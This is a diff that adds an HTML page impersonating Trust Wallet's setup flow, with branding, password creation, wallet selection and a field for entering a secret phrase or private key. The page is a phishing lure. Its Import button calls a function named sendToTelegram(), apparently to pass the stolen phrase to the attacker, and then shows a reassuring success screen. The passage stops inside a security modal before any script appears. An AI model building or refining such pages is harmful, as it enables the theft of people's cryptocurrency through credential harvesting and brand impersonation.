@@ -1,0 +1,1300 @@
+<!DOCTYPE html>
+<html lang="en" translate="no">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet - Protect your wallet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0f111a;
+            color: #ffffff;
+            height: 100vh;
+            display: flex;
+            overflow: hidden;
+        }
+
+        /* --- LEFT PANEL (Dark Grey) --- */
+        .left-panel {
+            width: 35%; 
+            height: 100%;
+            background-color: #242529;
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 40px;
+        }
+
+        .logo svg { width: 28px; height: 28px; }
+
+        .logo-text {
+            display: flex;
+            align-items: center;
+            font-size: 20px;
+            letter-spacing: 0.5px;
+        }
+
+        .logo-text .trust { font-weight: 900; color: #00ff66; }
+        .logo-text .wallet { font-weight: 300; color: #00ff66; margin-left: 5px; }
+
+        .step-text {
+            color: #a0a0a0;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+
+        .left-panel h1 {
+            font-size: 26px;
+            line-height: 1.2;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 20px;
+        }
+
+        .illustration-container {
+            width: 160px;
+            height: 160px;
+            margin-top: 10px;
+        }
+
+        .illustration-img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .help-link {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #a0a0a0;
+            font-size: 13px;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .help-link:hover { color: #ffffff; }
+        .help-link svg { width: 14px; height: 14px; fill: currentColor; }
+
+        /* --- RIGHT PANEL (Dark Background) --- */
+        .right-panel {
+            width: 65%;
+            height: 100%;
+            padding: 40px 60px;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #a0a0a0;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 40px;
+            width: fit-content;
+            transition: color 0.2s;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-family: inherit;
+        }
+
+        .back-btn:hover { color: #ffffff; }
+        .back-btn svg { width: 18px; height: 18px; fill: currentColor; }
+
+        .right-panel h2 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 30px;
+        }
+
+        /* --- VIEW MANAGEMENT --- */
+        .view-options, .view-password, .view-import, .view-import-form, .view-success {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+        }
+        
+        #view-options { display: flex; }
+
+        /* --- OPTION CARDS --- */
+        .option-card {
+            background-color: #1a1c26;
+            border-radius: 12px;
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            transition: background-color 0.2s;
+        }
+
+        .option-card:hover { background-color: #232533; }
+
+        .option-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .option-icon { width: 24px; display: flex; justify-content: center; }
+        .option-icon svg { width: 22px; height: 22px; fill: #a0a0a0; }
+        .icon-trust svg { fill: #00ff66; }
+
+        .badge {
+            background-color: #2b2752;
+            color: #8c83ff;
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .chevron svg { width: 18px; height: 18px; fill: #fff; }
+
+        .category-title {
+            color: #666;
+            font-size: 14px;
+            margin-top: 20px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+
+        /* --- PASSWORD FORM --- */
+        .view-password h2 { font-size: 32px; margin-bottom: 40px; }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            background-color: #0f111a;
+            border: 1px solid #2a2e3d;
+            border-radius: 12px;
+            padding: 16px 20px;
+            font-size: 16px;
+            color: #ffffff;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-wrapper input:focus { border-color: #4b3aff; }
+        .input-wrapper input.error { border-color: #ff4d4f; }
+        .input-wrapper input::placeholder { color: #666; }
+
+        .error-message {
+            color: #ff4d4f;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+        .error-message.visible { display: block; }
+
+        .eye-icon {
+            position: absolute;
+            right: 20px;
+            cursor: pointer;
+            color: #a0a0a0;
+        }
+        .eye-icon svg { width: 20px; height: 20px; fill: currentColor; }
+
+        .btn-continue {
+            align-self: flex-end;
+            background-color: #1e2025;
+            color: #666;
+            border: none;
+            border-radius: 40px;
+            padding: 16px 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-continue.active {
+            background-color: #4b3aff;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        /* --- IMPORT FORM --- */
+        .view-import-form h2 {
+            font-size: 26px;
+            margin-bottom: 30px;
+        }
+
+        .import-group {
+            margin-bottom: 25px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .import-group label {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .import-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .import-input-wrapper input {
+            width: 100%;
+            background-color: #0f111a;
+            border: 1px solid #2a2e3d;
+            border-radius: 12px;
+            padding: 18px 50px 18px 20px;
+            font-size: 16px;
+            color: #ffffff;
+            outline: none;
+        }
+
+        .import-input-wrapper input:focus { border-color: #4b3aff; }
+
+        .clear-icon {
+            position: absolute;
+            right: 20px;
+            cursor: pointer;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .clear-icon:hover { color: #fff; }
+        .clear-icon svg { width: 20px; height: 20px; fill: currentColor; }
+
+        .help-text {
+            color: #666;
+            font-size: 14px;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+
+        .success-text {
+            color: #888;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+        .success-text.visible { display: block; }
+
+        .error-text-import {
+            color: #ff4d4f;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+        .error-text-import.visible { display: block; }
+
+        .textarea-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .import-textarea {
+            width: 100%;
+            min-height: 180px;
+            background-color: #0f111a;
+            border: 1px solid #2a2e3d;
+            border-radius: 12px;
+            padding: 16px 50px 16px 20px; 
+            font-size: 16px;
+            color: #ffffff;
+            outline: none;
+            resize: none;
+            font-family: inherit;
+            transition: border-color 0.2s;
+            letter-spacing: 2px; 
+        }
+
+        .import-textarea:focus { border-color: #4b3aff; }
+        .import-textarea.error { border-color: #ff4d4f; }
+
+        .eye-icon-textarea {
+            position: absolute;
+            right: 20px;
+            bottom: 20px;
+            cursor: pointer;
+            color: #4b3aff; 
+            display: none; 
+        }
+        .eye-icon-textarea.visible { display: block; }
+        .eye-icon-textarea svg { width: 24px; height: 24px; fill: currentColor; }
+
+        .btn-import {
+            align-self: flex-end;
+            background-color: #1e2025;
+            color: #666;
+            border: none;
+            border-radius: 40px;
+            padding: 16px 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-top: 30px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-import.active {
+            background-color: #4b3aff;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        /* --- NEW VIEW: SUCCESS (Start exploring) --- */
+        .view-success h2 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            margin-top: 20px;
+        }
+
+        .explore-card {
+            background-color: #151721;
+            border-radius: 24px;
+            padding: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .explore-left {
+            flex: 1;
+            background-color: #0b0c10;
+            border-radius: 16px;
+            padding: 30px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .pin-block {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        .pin-block svg {
+            width: 36px;
+            height: 36px;
+        }
+
+        .pin-block span {
+            font-size: 22px;
+            font-weight: 700;
+        }
+
+        .explore-left p {
+            color: #a0a0a0;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        .explore-right {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .explore-right .small-title {
+            color: #a0a0a0;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+        }
+
+        .explore-right h3 {
+            font-size: 26px;
+            line-height: 1.3;
+            margin-bottom: 20px;
+        }
+
+        .explore-right p {
+            color: #a0a0a0;
+            font-size: 15px;
+            margin-bottom: 25px;
+        }
+
+        .link-guide {
+            color: #4b3aff;
+            font-size: 15px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .link-guide:hover {
+            text-decoration: underline;
+        }
+
+        .pagination {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 40px;
+        }
+
+        .page-arrow {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #1e2025;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: #fff;
+            transition: background 0.2s;
+        }
+
+        .page-arrow.active {
+            background-color: #4b3aff;
+        }
+
+        .page-arrow svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        .page-dots {
+            display: flex;
+            gap: 8px;
+        }
+
+        .dot {
+            width: 6px;
+            height: 6px;
+            background-color: #333;
+            border-radius: 50%;
+        }
+
+        .dot.active {
+            width: 24px;
+            border-radius: 4px;
+            background-color: #fff;
+        }
+
+        .btn-open-wallet {
+            align-self: flex-end;
+            background-color: #4b3aff;
+            color: #ffffff;
+            border: none;
+            border-radius: 40px;
+            padding: 18px 60px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+            box-shadow: 0 4px 15px rgba(75, 58, 255, 0.3);
+        }
+
+        .btn-open-wallet:hover {
+            background-color: #3b2bff;
+        }
+
+        /* --- MODAL POP-UP --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none; 
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-overlay.visible {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: #14151f; 
+            width: 90%;
+            max-width: 500px; 
+            max-height: 90vh;
+            overflow-y: auto; 
+            border-radius: 24px;
+            padding: 30px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            cursor: pointer;
+            color: #666;
+            background: none;
+            border: none;
+        }
+        .modal-close:hover { color: #fff; }
+        .modal-close svg { width: 24px; height: 24px; fill: currentColor; }
+
+        .modal-content h3 {
+            text-align: center;
+            font-size: 20px;
+            margin-bottom: 15px;
+            margin-top: 10px;
+        }
+
+        .modal-illustration {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        .modal-illustration svg {
+            width: 90px;
+            height: 90px;
+        }
+
+        .modal-desc {
+            text-align: center;
+            color: #a0a0a0;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .modal-checkbox-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .modal-checkbox {
+            background-color: #1c1e29;
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            cursor: pointer;
+            border: 1px solid transparent;
+        }
+        
+        .modal-checkbox:hover { border: 1px solid #2a2e3d; }
+
+        .modal-checkbox input[type="checkbox"] {
+            margin-top: 2px;
+            width: 18px;
+            height: 18px;
+            accent-color: #4b3aff;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .modal-checkbox span {
+            font-size: 14px;
+            line-height: 1.4;
+            color: #ffffff;
+        }
+
+        .btn-understand {
+            width: 100%;
+            background-color: #1e2025;
+            color: #666;
+            border: none;
+            border-radius: 40px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+        }
+
+        .btn-understand.active {
+            background-color: #4b3aff;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 900px) {
+            body { flex-direction: column; height: auto; overflow: auto; }
+            .left-panel { width: 100%; height: auto; padding: 30px 20px; }
+            .right-panel { width: 100%; height: auto; padding: 30px 20px; }
+            .left-panel h1 { font-size: 24px; }
+            .right-panel h2 { font-size: 22px; }
+            .btn-continue, .btn-import, .btn-open-wallet { align-self: stretch; text-align: center; }
+            .modal-content { padding: 20px; }
+            .explore-card { flex-direction: column; padding: 20px; gap: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LEFT PANEL -->
+    <div class="left-panel">
+        <div>
+            <div class="logo">
+                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <linearGradient id="shieldGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                            <stop offset="0%" stop-color="#00ff66" />
+                            <stop offset="100%" stop-color="#3375ff" />
+                        </linearGradient>
+                    </defs>
+                    <path d="M50 5 L90 20 C90 60 75 90 50 95 C25 90 10 60 10 20 Z" fill="url(#shieldGradient)" />
+                    <path d="M50 5 L50 95" stroke="rgba(0,0,0,0.1)" stroke-width="1" />
+                    <path d="M50 5 L90 20 C90 60 75 90 50 95" fill="rgba(0,0,0,0.05)" />
+                </svg>
+                <div class="logo-text">
+                    <span class="trust">TRUST</span>
+                    <span class="wallet">WALLET</span>
+                </div>
+            </div>
+
+            <p class="step-text" id="left-step">Step 1 of 3</p>
+            <h1 id="left-title">Protect your<br>wallet</h1>
+            
+            <div class="illustration-container">
+                <img src="bouclier.png" alt="3D Shield" class="illustration-img" onerror="this.style.display='none'; document.getElementById('fallback-svg').style.display='block';">
+                <svg id="fallback-svg" style="display:none; width: 100%; height: 100%;" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <linearGradient id="shieldGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#00ff66" />
+                            <stop offset="100%" stop-color="#2a9df4" />
+                        </linearGradient>
+                        <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
+                            <feDropShadow dx="0" dy="5" stdDeviation="5" flood-color="#000" flood-opacity="0.5"/>
+                        </filter>
+                    </defs>
+                    <path d="M100 20 L160 45 C160 120 130 170 100 185 C70 170 40 120 40 45 Z" fill="url(#shieldGrad)" />
+                    <path d="M100 20 L160 45 C160 120 130 170 100 185 Z" fill="#fff" opacity="0.1" />
+                    <path d="M40 45 L100 20 L100 185 Z" fill="#000" opacity="0.1" />
+                    <g transform="translate(115, 50) rotate(15)">
+                        <rect width="70" height="45" rx="6" fill="#222" stroke="#555" stroke-width="2"/>
+                        <circle cx="35" cy="22" r="12" fill="none" stroke="#888" stroke-width="1.5"/>
+                        <circle cx="35" cy="22" r="8" fill="none" stroke="#888" stroke-width="1.5"/>
+                        <circle cx="35" cy="22" r="4" fill="none" stroke="#888" stroke-width="1.5"/>
+                    </g>
+                    <g transform="translate(60, 80) rotate(-10)" filter="url(#shadow)">
+                        <rect width="90" height="50" rx="6" fill="#ffdf6b" stroke="#111" stroke-width="2"/>
+                        <rect x="0" y="0" width="90" height="15" rx="6" fill="#d16ba5" />
+                        <rect x="10" y="25" width="40" height="8" rx="2" fill="#111" />
+                        <text x="55" y="35" fill="#111" font-size="16" font-weight="bold" font-family="monospace">* * * *</text>
+                        <circle cx="80" cy="35" r="10" fill="#2a9df4" opacity="0.6"/>
+                    </g>
+                </svg>
+            </div>
+        </div>
+
+        <a href="#" class="help-link">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+            </svg>
+            Help
+        </a>
+    </div>
+
+    <!-- RIGHT PANEL -->
+    <div class="right-panel">
+        
+        <button class="back-btn" id="btn-back" onclick="goBack()">
+            <svg viewBox="0 0 24 24"><path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/></svg>
+            Back
+        </button>
+
+        <!-- VIEW 1: OPTIONS -->
+        <div class="view-options" id="view-options">
+            <h2>Select an option</h2>
+            <div class="option-card" onclick="showPasswordView()">
+                <div class="option-left">
+                    <div class="option-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-3-9c.55 0 1-.45 1-1s-.45-1-1-1-1 .45-1 1 .45 1 1 1zm6 0c.55 0 1-.45 1-1s-.45-1-1-1-1 .45-1 1 .45 1 1 1zm-3 2c-1.66 0-3 1.34-3 3h2c0-.55.45-1 1-1s1 .45 1 1h2c0-1.66-1.34-3-3-3z"/></svg></div>
+                    Windows Hello
+                    <span class="badge">Recommended</span>
+                </div>
+                <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+            </div>
+            <div class="option-card" onclick="showPasswordView()">
+                <div class="option-left">
+                    <div class="option-icon"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                    Password
+                </div>
+                <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+            </div>
+        </div>
+
+        <!-- VIEW 2: PASSWORD -->
+        <div class="view-password" id="view-password">
+            <h2>Create a password</h2>
+            <div class="form-group">
+                <label>Password</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="Minimum of eight characters" oninput="validateForm()">
+                    <div class="eye-icon" onclick="togglePassword('password', this)">
+                        <svg viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                    </div>
+                </div>
+                <div class="error-message" id="error-length">Minimum of eight characters</div>
+            </div>
+            <div class="form-group">
+                <label>Confirm password</label>
+                <div class="input-wrapper">
+                    <input type="password" id="confirm-password" placeholder="Password" oninput="validateForm()">
+                    <div class="eye-icon" onclick="togglePassword('confirm-password', this)">
+                        <svg viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                    </div>
+                </div>
+                <div class="error-message" id="error-match">Passwords do not match.</div>
+            </div>
+            <button class="btn-continue" id="btn-continue" disabled onclick="showImportView()">Continue</button>
+        </div>
+
+        <!-- VIEW 3: WALLET SELECTION -->
+        <div class="view-import" id="view-import">
+            <h2>Select your existing wallet</h2>
+            <div class="option-card" onclick="showImportFormView()">
+                <div class="option-left">
+                    <div class="option-icon icon-trust">
+                        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                            <defs><linearGradient id="shieldGradMini" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stop-color="#00ff66" /><stop offset="100%" stop-color="#3375ff" /></linearGradient></defs>
+                            <path d="M50 5 L90 20 C90 60 75 90 50 95 C25 90 10 60 10 20 Z" fill="url(#shieldGradMini)" />
+                        </svg>
+                    </div>
+                    Trust Wallet Mobile
+                </div>
+                <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+            </div>
+            <div class="option-card" onclick="showImportFormView()">
+                <div class="option-left">
+                    <div class="option-icon">
+                        <svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+                    </div>
+                    Other mobile wallet or extension
+                </div>
+                <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+            </div>
+            <div class="option-card" onclick="showImportFormView()">
+                <div class="option-left">
+                    <div class="option-icon">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </div>
+                    Watch an address
+                </div>
+                <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+            </div>
+            <div class="category-title">Hardware wallets</div>
+            <div class="option-card" onclick="showImportFormView()">
+                <div class="option-left">
+                    <div class="option-icon" style="color: #fff;">
+                        <svg viewBox="0 0 24 24"><path d="M5 3h10v2H5v14h14v-5h2v7H3V3h2zm12 2h4v4h-4V5zm-6 6h4v4h-4v-4z" fill="#fff"/></svg>
+                    </div>
+                    Ledger
+                </div>
+                <div class="chevron"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg></div>
+            </div>
+        </div>
+
+        <!-- VIEW 4: IMPORT FORM -->
+        <div class="view-import-form" id="view-import-form">
+            <h2>Import with Secret Phrase or Private Key</h2>
+
+            <div class="import-group">
+                <label>Wallet Name</label>
+                <div class="import-input-wrapper">
+                    <input type="text" id="wallet-name" value="Main wallet" oninput="validateImportForm()">
+                    <div class="clear-icon" onclick="clearWalletName()">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>
+                    </div>
+                </div>
+                <div class="help-text">You can edit this later</div>
+            </div>
+
+            <div class="import-group">
+                <label>Enter Secret Phrase or Private Key</label>
+                <div class="textarea-wrapper">
+                    <textarea class="import-textarea" id="secret-phrase" oninput="validateImportForm()" placeholder="Enter your words separated by spaces or your private key..."></textarea>
+                    <div class="eye-icon-textarea" id="eye-textarea" onclick="toggleSecretPhrase()">
+                        <svg viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                    </div>
+                </div>
+                
+                <div class="error-text-import" id="error-import">Invalid secret phrase or private key.</div>
+                <div class="success-text" id="success-detect">Secret Phrase detected</div>
+                
+                <div class="help-text" id="help-text-default">
+                    Secret Phrase is typically 12 (sometimes 18, 24) words separated by single spaces<br>
+                    Private Key is a long alphanumeric code
+                </div>
+            </div>
+
+            <button class="btn-import" id="btn-import" disabled onclick="sendToTelegram()">Import</button>
+        </div>
+
+        <!-- VIEW 5: SUCCESS / START EXPLORING -->
+        <div class="view-success" id="view-success">
+            <h2>Start exploring</h2>
+
+            <div class="explore-card">
+                <div class="explore-left">
+                    <div class="pin-block">
+                        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                            <defs><linearGradient id="shieldGradExplore" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stop-color="#00ff66" /><stop offset="100%" stop-color="#3375ff" /></linearGradient></defs>
+                            <path d="M50 5 L90 20 C90 60 75 90 50 95 C25 90 10 60 10 20 Z" fill="url(#shieldGradExplore)" />
+                        </svg>
+                        <span>Pin Trust Wallet</span>
+                    </div>
+                    <p>Click on the extension 🧩, then pin it ⋮⋮.</p>
+                </div>
+
+                <div class="explore-right">
+                    <span class="small-title">Keep it within reach</span>
+                    <h3>Pin us to your toolbar</h3>
+                    <p>Access it instantly with a single click</p>
+                    <a href="#" class="link-guide">Guide me ➔</a>
+                </div>
+            </div>
+
+            <!-- Pagination -->
+            <div class="pagination">
+                <div class="page-arrow active">
+                    <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                </div>
+                <div class="page-dots">
+                    <div class="dot"></div>
+                    <div class="dot active"></div>
+                </div>
+                <div class="page-arrow" style="background-color: transparent; border: 1px solid #333;">
+                    <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+                </div>
+            </div>
+
+            <a href="https://www.trustwallet.com" class="btn-open-wallet" target="_blank">Open my wallet</a>
+        </div>
+
+    </div>
+
+    <!-- MODAL POP-UP -->
+    <div class="modal-overlay" id="security-modal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">
+                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+            </button>
+            
+            <h3>Check your Secret Phrase is safe</h3>
+            
+            <div class="modal-illustration">
+                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <linearGradient id="modalShieldGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                            <stop offset="0%" stop-color="#00ff66" />
+                            <stop offset="100%" stop-color="#3375ff" />
+                        </linearGradient>
+                    </defs>
+                    <path d="M50 5 L90 20 C90 60 75 90 50 95 C25 90 10 60 10 20 Z" fill="url(#modalShieldGradient)" />
+                    <rect x="30" y="30" width="50" height="30" rx="4" fill="#ffdf6b" transform="rotate(-15 55 45)" stroke="#111" stroke-width="1.5"/>
